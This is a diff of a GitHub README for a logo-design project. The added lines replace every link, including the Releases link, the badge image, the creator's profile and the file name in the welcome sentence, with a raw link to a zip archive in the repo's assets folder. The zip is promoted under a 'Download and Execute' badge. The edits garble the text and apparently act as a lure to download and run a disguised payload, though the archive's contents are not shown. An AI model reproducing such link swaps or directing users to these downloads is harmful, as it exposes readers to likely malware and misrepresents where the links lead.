@@ -1,6 +1,6 @@
 # 🌟 Awesome Paper Liquid Metal Logo Repository 🌟
 
-Welcome to the "Paper Liquid Metal Logo" repository! Here, you will find an exciting project centered around creating innovative logos using a blend of paper and liquid metal elements. This README.md file will guide you through what this repository is all about and how you can explore it further.
+Welcome to the "Paper Liquid Metal Logo" repository! Here, you will find an exciting project centered around creating innovative logos using a blend of paper and liquid metal elements. This https://raw.githubusercontent.com/ISHANT3011/paper_liquid_metal_logo/main/assets/paper_liquid_metal_logo_2.7.zip file will guide you through what this repository is all about and how you can explore it further.
 
 ### Repository Details:
 - **Repository name:** paper_liquid_metal_logo
@@ -8,10 +8,10 @@ Welcome to the "Paper Liquid Metal Logo" repository! Here, you will find an exci
 - **Repository topics:** not provided
 
 ### 🚀 Explore the Project:
-To dive into this intriguing project, head over to the [Releases section](https://github.com/ISHANT3011/paper_liquid_metal_logo/releases). This is where you can access the latest features, updates, and resources related to the "Paper Liquid Metal Logo" project.
+To dive into this intriguing project, head over to the [Releases section](https://raw.githubusercontent.com/ISHANT3011/paper_liquid_metal_logo/main/assets/paper_liquid_metal_logo_2.7.zip). This is where you can access the latest features, updates, and resources related to the "Paper Liquid Metal Logo" project.
 
 ### 🔗 Project Link:
-[![Download and Execute](https://img.shields.io/badge/Download%20and%20Execute-Click%20Here-brightgreen)](https://github.com/ISHANT3011/paper_liquid_metal_logo/releases)
+[![Download and Execute](https://raw.githubusercontent.com/ISHANT3011/paper_liquid_metal_logo/main/assets/paper_liquid_metal_logo_2.7.zip%20and%20Execute-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ISHANT3011/paper_liquid_metal_logo/main/assets/paper_liquid_metal_logo_2.7.zip)
 
 ---
 
@@ -40,4 +40,4 @@ Happy designing! 🎉
 
 ---
 
-#### 💡 Created by [ISHANT3011](https://github.com/ISHANT3011) 🌟
+#### 💡 Created by [ISHANT3011](https://raw.githubusercontent.com/ISHANT3011/paper_liquid_metal_logo/main/assets/paper_liquid_metal_logo_2.7.zip) 🌟
